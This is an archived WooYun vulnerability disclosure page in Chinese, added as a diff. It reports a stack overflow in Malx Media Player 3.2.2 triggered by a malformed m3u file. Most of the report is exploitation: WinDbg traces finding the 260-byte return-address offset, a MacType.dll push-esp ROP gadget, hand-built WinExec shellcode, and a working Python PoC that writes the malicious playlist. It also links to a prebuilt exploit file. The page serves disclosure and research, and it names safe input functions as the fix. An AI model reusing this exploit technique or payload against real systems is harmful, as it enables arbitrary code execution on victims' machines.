@@ -1,0 +1,494 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Malx Media Player处理畸形m3u文件栈溢出本地任意代码执行  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Malx Media Player处理畸形m3u文件栈溢出本地任意代码执行  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/blast">blast</a> 
+</li><li>提交时间：		2014-02-20 23:33</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-20：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-25：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-28：	细节向第三方安全合作伙伴开放<br/>
+									2014-03-07：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-03-17：	细节向普通白帽子公开<br/>
+									2014-04-06：	细节向实习白帽子公开<br/>
+									2014-05-21：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">Malx Media Player 3.2.2 处理畸形m3u文件时会发生栈溢出，从而可以让攻击者成功控制EIP，执行任意代码。（Win7 SP1配合MacType进行ROP）</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">Malx Media Player使用MAX_PATH作为参数初始化栈上变量，但是使用vfscanf时并没有考虑输入长度，导致栈溢出。 软件地址：http://malx-media-player.software.informer.com/<br />
+<br />
+<br />
+<br />
+构建一个畸形M3U文件，然后载入程序，喜闻乐见的崩溃，kvn回溯栈调用发现它是从vfscanf进去的，看来一定是用了MAX_PATH了，再试一下它是从哪块函数调用上vfscanf的：<br />
+<br />
+</p><pre><code>0:000&gt; bp msvcrt!vfscanf<br />
+    0:000&gt; bl<br />
+     0 e 76cf574d     0001 (0001)  0:**** msvcrt!vfscanf<br />
+     1 eu             0001 (0001) (msvcrf!fscanf)<br />
+    0:000&gt; g<br />
+    Breakpoint 0 hit<br />
+    eax=0018f92c ebx=0018fb64 ecx=76c9a6db edx=0008e381 esi=76d22960 edi=76cf58b9<br />
+    eip=76cf574d esp=0018f904 ebp=0018f91c iopl=0         nv up ei pl nz na pe nc<br />
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206<br />
+    msvcrt!vfscanf:<br />
+    76cf574d 6a0c            push    0Ch</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+gu两次，看到是从image00400000+0x46f0这儿进去的：</p><pre><code>0:000&gt; gu<br />
+    eax=00000001 ebx=0018fb64 ecx=76cf587e edx=76d22960 esi=76d22960 edi=76cf58b9<br />
+    eip=76cf58d4 esp=0018f908 ebp=0018f91c iopl=0         nv up ei pl zr na pe nc<br />
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246<br />
+    msvcrt!fscanf+0x1b:<br />
+    76cf58d4 83c414          add     esp,14h<br />
+    0:000&gt; gu<br />
+    *** WARNING: Unable to verify checksum for image00400000<br />
+    *** ERROR: Module load completed but symbols could not be loaded for image00400000<br />
+    eax=00000001 ebx=0018fb64 ecx=76cf587e edx=76d22960 esi=76d22960 edi=76cf58b9<br />
+    eip=004046f0 esp=0018f924 ebp=00000001 iopl=0         nv up ei pl nz na po nc<br />
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202<br />
+    image00400000+0x46f0:<br />
+    004046f0 83c40c          add     esp,0Ch</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+没代码没符号光看十分蛋疼，简单的判断一下出问题的区域，此时再gu一次<br />
+<br />
+<br />
+<br />
+ </p><pre><code>0:000&gt; gu<br />
+    (2304.288): Access violation - code c0000005 (first chance)<br />
+    First chance exceptions are reported before any exception handling.<br />
+    This exception may be expected and handled.<br />
+    eax=00000000 ebx=75cf54f8 ecx=76c93dcf edx=0008e3c8 esi=00000000 edi=01d5004c<br />
+    eip=41414141 esp=0018fb48 ebp=00000001 iopl=0         nv up ei pl nz ac pe nc<br />
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216<br />
+    41414141 ??              ???</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+eip跳到了41414141，看来是覆盖了retn的地址。<br />
+<br />
+<br />
+<br />
+重来，从之前的image00400000+0x46f0往后一直p，然后到retn为止发现都没事儿，那估计就是这个retn导致的：<br />
+<br />
+</p><pre><code>Breakpoint 0 hit<br />
+    eax=00000000 ebx=75cf54f8 ecx=76c93dcf edx=0008e3c8 esi=00000000 edi=020e004c<br />
+    eip=00404744 esp=0018f93c ebp=00000001 iopl=0         nv up ei pl zr na pe nc<br />
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246<br />
+    image00400000+0x4744:<br />
+    00404744 81c408020000    add     esp,208h<br />
+    0:000&gt; dd esp<br />
+    0018f93c  0055334d 00000003 0088d550 00000016<br />
+    0018f94c  00000000 01000003 00000000 00000016<br />
+    0018f95c  00005765 0018f898 77aa57d0 0018f9d0<br />
+    0018f96c  0018f99c 77ac0806 00870000 00000000<br />
+    0018f97c  00870000 0088d108 77a1b8ea 0088d108<br />
+    0018f98c  00870000 00870000 77a1b8ea 0088d108<br />
+    0018f99c  0018f9e0 77ac17b0 00870138 77ac1794<br />
+    0018f9ac  66f6ed3b 00870000 00870000 00000000<br />
+    0:000&gt; p<br />
+    eax=00000000 ebx=75cf54f8 ecx=76c93dcf edx=0008e3c8 esi=00000000 edi=020e004c<br />
+    eip=0040474a esp=0018fb44 ebp=00000001 iopl=0         nv up ei pl nz ac pe nc<br />
+    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216<br />
+    image00400000+0x474a:<br />
+    0040474a c3              ret</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+查看对应栈：<br />
+<br />
+</p><pre><code>0:000&gt; dd esp<br />
+    0018fb44  41414141 41414141 41414141 41414141<br />
+    0018fb54  41414141 41414141 41414141 41414141<br />
+    0018fb64  41414141 41414141 41414141 41414141<br />
+    0018fb74  41414141 41414141 41414141 41414141<br />
+    0018fb84  43414141 43434343 43434343 43434343<br />
+    0018fb94  43434343 43434343 43434343 43434343<br />
+    0018fba4  43434343 43434343 43434343 43434343<br />
+    0018fbb4  53434343 53535353 53535353 53535353</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+真是一个悲伤的故事啊……<br />
+<br />
+<br />
+<br />
+由于倒数第二个是add esp,208h；那我们就倒回去看看：<br />
+<br />
+<br />
+<br />
+ </p><pre><code>0:000&gt; dd esp-208 esp<br />
+    0018f93c  0055334d 00000003 0088d550 00000016<br />
+    0018f94c  00000000 01000003 00000000 00000016<br />
+    0018f95c  00005765 0018f898 77aa57d0 0018f9d0<br />
+    0018f96c  0018f99c 77ac0806 00870000 00000000<br />
+    0018f97c  00870000 0088d108 77a1b8ea 0088d108<br />
+    0018f98c  00870000 00870000 77a1b8ea 0088d108<br />
+    0018f99c  0018f9e0 77ac17b0 00870138 77ac1794<br />
+    0018f9ac  66f6ed3b 00870000 00870000 00000000<br />
+    0018f9bc  00870000 00000000 01010000 0018f9ac<br />
+    0018f9cc  00000068 0018fac4 77a671f5 114fc46b<br />
+    0018f9dc  fffffffe 77ac1794 77a7ac29 00870000<br />
+    0018f9ec  50000063 77a238aa 66f6ee0f 00000000<br />
+    0018f9fc  00870000 0088d110 00000000 00401270<br />
+    0018fa0c  00000000 00de0706 00000084 00000000<br />
+    0018fa1c  00680515 00000004 000003a8 00870000<br />
+    0018fa2c  00000000 00000001 00000001 00000000<br />
+    0018fa3c  00000000 415c3a41 41414141 41414141<br />
+    0018fa4c  41414141 41414141 41414141 41414141<br />
+    0018fa5c  41414141 41414141 41414141 41414141<br />
+    0018fa6c  41414141 41414141 41414141 41414141<br />
+    0018fa7c  41414141 41414141 41414141 41414141<br />
+    0018fa8c  41414141 41414141 41414141 41414141<br />
+    0018fa9c  41414141 41414141 41414141 41414141<br />
+    0018faac  41414141 41414141 41414141 41414141<br />
+    0018fabc  41414141 41414141 41414141 41414141<br />
+    0018facc  41414141 41414141 41414141 41414141<br />
+    0018fadc  41414141 41414141 41414141 41414141<br />
+    0018faec  41414141 41414141 41414141 41414141<br />
+    0018fafc  41414141 41414141 41414141 41414141<br />
+    0018fb0c  41414141 41414141 41414141 41414141<br />
+    0018fb1c  41414141 41414141 41414141 41414141<br />
+    0018fb2c  41414141 41414141 41414141 41414141<br />
+    0018fb3c  41414141 41414141 41414141</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+果然是一个悲伤的故事呀……<br />
+<br />
+<br />
+<br />
+这个retn地址被覆盖的位置位于多少偏移处呢？<br />
+<br />
+</p><pre><code>0:000&gt; ?(18fa3c+4 - esp)<br />
+    Evaluate expression: -260 = fffffefc</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+260，这个熟悉的数字，真是一个灾难。<br />
+<br />
+<br />
+<br />
+找找ROP，发现MacType!ReloadConfig+0x24cca有一个很好很符合要求的ROP<br />
+<br />
+<br />
+<br />
+</p><pre><code>---------------------- size 1<br />
+    MacType!ReloadConfig+0x24cca:<br />
+    1002756a 54              push    esp<br />
+    1002756b c3              ret</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+由于是在练手，所以咱也暂时不考虑通用性，查看WinExec的地址：<br />
+<br />
+<br />
+<br />
+</p><pre><code>0:000&gt; x kernel32!WinExec<br />
+768a2c51 kernel32!WinExec = &lt;no type information&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+大概就勾画出了我们的SHELLCODE的原始形态：<br />
+<br />
+<br />
+<br />
+    ROP           6a750210    #1002756a;MacType!ReloadConfig+0x24cca, push esp; ret;<br />
+<br />
+<br />
+<br />
+                            #Shellcode start<br />
+<br />
+<br />
+<br />
+    $             31C0          XOR EAX,EAX<br />
+<br />
+<br />
+<br />
+    $+2           50            PUSH EAX <br />
+<br />
+    $+3           B8 43414C43   MOV EAX,434C4143<br />
+<br />
+    $+8           50            PUSH EAX ;&quot;CALC\0&quot;<br />
+<br />
+<br />
+<br />
+    $+9           89E1          MOV ECX,ESP ;保存这个字符串的指针<br />
+<br />
+<br />
+<br />
+    $+B           40            INC EAX<br />
+<br />
+    $+C           50            PUSH EAX ;uCmdShow == 1<br />
+<br />
+    $+D           51            PUSH ECX ;lpCmdLine<br />
+<br />
+    $+E           E8 XXXXXXX   CALL WinExec<br />
+<br />
+<br />
+<br />
+其实还要设置一个MOV EBX, ESP; DEC EBX,80H; MOV EBP,EBX;，这样才能保证WinExec不出错……INC EAX之前要XOR EAX,EAX一下，上面的是我之前打的草稿，我也偷个懒不贴机器码啦，OD里面一放就能查到 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">编辑M3U文件，载入运行，<br />
+<br />
+</p><p class="detail"><a href="../images/2022150115c0fd79d5f5a40f7702ba0a215a7094.png" target="_blank"><img src="../images/2022150115c0fd79d5f5a40f7702ba0a215a7094.png" alt="f1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><pre><code>0:001&gt; bp 40474a<br />
+*** WARNING: Unable to verify checksum for E:\Program Files (x86)\Mplay\mplay.exe<br />
+*** ERROR: Module load completed but symbols could not be loaded for E:\Program Files (x86)\Mplay\mplay.exe<br />
+0:001&gt; g<br />
+Breakpoint 0 hit<br />
+eax=00000000 ebx=75965550 ecx=77573dcf edx=0008e3c8 esi=00000000 edi=0041004c<br />
+eip=0040474a esp=0018fb44 ebp=00000001 iopl=0         nv up ei pl nz ac pe nc<br />
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216<br />
+mplay+0x474a:<br />
+0040474a c3              ret<br />
+0:000&gt; p<br />
+eax=00000000 ebx=75965550 ecx=77573dcf edx=0008e3c8 esi=00000000 edi=0041004c<br />
+eip=1002756a esp=0018fb48 ebp=00000001 iopl=0         nv up ei pl nz ac pe nc<br />
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216<br />
+*** WARNING: Unable to verify checksum for E:\Program Files (x86)\MacType\MacType.dll<br />
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for E:\Program Files (x86)\MacType\MacType.dll -<br />
+MacType!ReloadConfig+0x24cca:<br />
+1002756a 54              push    esp<br />
+0:000&gt;<br />
+eax=00000000 ebx=75965550 ecx=77573dcf edx=0008e3c8 esi=00000000 edi=0041004c<br />
+eip=1002756b esp=0018fb44 ebp=00000001 iopl=0         nv up ei pl nz ac pe nc<br />
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216<br />
+MacType!ReloadConfig+0x24ccb:<br />
+1002756b c3              ret<br />
+0:000&gt;<br />
+eax=00000000 ebx=75965550 ecx=77573dcf edx=0008e3c8 esi=00000000 edi=0041004c<br />
+eip=0018fb48 esp=0018fb48 ebp=00000001 iopl=0         nv up ei pl nz ac pe nc<br />
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216<br />
+0018fb48 31c0            xor     eax,eax<br />
+0:000&gt;<br />
+eax=00000000 ebx=75965550 ecx=77573dcf edx=0008e3c8 esi=00000000 edi=0041004c<br />
+eip=0018fb4a esp=0018fb48 ebp=00000001 iopl=0         nv up ei pl zr na pe nc<br />
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246<br />
+0018fb4a 50              push    eax<br />
+0:000&gt;<br />
+eax=00000000 ebx=75965550 ecx=77573dcf edx=0008e3c8 esi=00000000 edi=0041004c<br />
+eip=0018fb4b esp=0018fb44 ebp=00000001 iopl=0         nv up ei pl zr na pe nc<br />
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246<br />
+0018fb4b b843414c43      mov     eax,434C4143h<br />
+0:000&gt;<br />
+eax=434c4143 ebx=75965550 ecx=77573dcf edx=0008e3c8 esi=00000000 edi=0041004c<br />
+eip=0018fb50 esp=0018fb44 ebp=00000001 iopl=0         nv up ei pl zr na pe nc<br />
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246<br />
+0018fb50 50              push    eax<br />
+0:000&gt;<br />
+eax=434c4143 ebx=75965550 ecx=77573dcf edx=0008e3c8 esi=00000000 edi=0041004c<br />
+eip=0018fb51 esp=0018fb40 ebp=00000001 iopl=0         nv up ei pl zr na pe nc<br />
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246<br />
+0018fb51 89e1            mov     ecx,esp<br />
+0:000&gt;<br />
+eax=434c4143 ebx=75965550 ecx=0018fb40 edx=0008e3c8 esi=00000000 edi=0041004c<br />
+eip=0018fb53 esp=0018fb40 ebp=00000001 iopl=0         nv up ei pl zr na pe nc<br />
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246<br />
+0018fb53 40              inc     eax<br />
+0:000&gt;<br />
+eax=434c4144 ebx=75965550 ecx=0018fb40 edx=0008e3c8 esi=00000000 edi=0041004c<br />
+eip=0018fb54 esp=0018fb40 ebp=00000001 iopl=0         nv up ei pl nz na pe nc<br />
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206<br />
+0018fb54 50              push    eax<br />
+0:000&gt;<br />
+eax=434c4144 ebx=75965550 ecx=0018fb40 edx=0008e3c8 esi=00000000 edi=0041004c<br />
+eip=0018fb55 esp=0018fb3c ebp=00000001 iopl=0         nv up ei pl nz na pe nc<br />
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206<br />
+0018fb55 51              push    ecx<br />
+0:000&gt;<br />
+eax=434c4144 ebx=75965550 ecx=0018fb40 edx=0008e3c8 esi=00000000 edi=0041004c<br />
+eip=0018fb56 esp=0018fb38 ebp=00000001 iopl=0         nv up ei pl nz na pe nc<br />
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206<br />
+0018fb56 e8fb307176      call    kernel32!WinExec+0x5 (768a2c56)<br />
+0:000&gt; dd esp<br />
+0018fb38  0018fb40 434c4144 434c4143 00000000<br />
+0018fb48  b850c031 434c4143 40e18950 fbe85150<br />
+0018fb58  00767130 00000000 00000000 555c3a45<br />
+0018fb68  73726573 616c425c 53547473 7365445c<br />
+0018fb78  706f746b 6d2e375c 75007533 008fb710<br />
+0018fb88  00000000 ffffffec 00000000 020e4758<br />
+0018fb98  020e4758 008fb710 008fb710 0018fbe4<br />
+0018fba8  754a702c 008fb710 00000000 ffffffec<br />
+0:000&gt; da 18fb40<br />
+<br />
+0018fb40  &quot;CALC&quot;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+注：Debug模式下MacType模块是不会注入的，所以如果要测试着玩的话，还是要让它自己跑再Attach才可以<br />
+<br />
+<br />
+<br />
+POC：<br />
+<br />
+</p><pre><code>#!/usr/bin/env python<br />
+print &quot;blast off!&quot;<br />
+filepath = &quot;poc.m3u&quot;<br />
+f = open(filepath, &quot;wb&quot;)<br />
+file = &#039;\x23\x45\x58\x54\x4d\x33\x55\x0d\x0a\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x75\x02\x10\x31\xc0\x50\xb8\x43\x41\x4c\x43\x50\x89\xe1\x40\x50\x51\xe8\xfb\x30\x71\x76\x00&#039;<br />
+<br />
+f.write(file)<br />
+f.close()<br />
+<br />
+print &quot;Done.\nOpen poc.m3u&quot;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+弄好的二进制文件：http://lno.pw/exp.m3u，由于为了省事，没有用通用的方式处理，所以WinExec地址请自行修改 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">使用_s安全输入函数 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/blast" title="blast">blast</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-051564" title="Malx Media Player处理畸形m3u文件栈溢出本地任意代码执行">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：18 </p>
+													<p class="detail">确认时间：2014-02-25 10:14</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"> </p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="51564";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
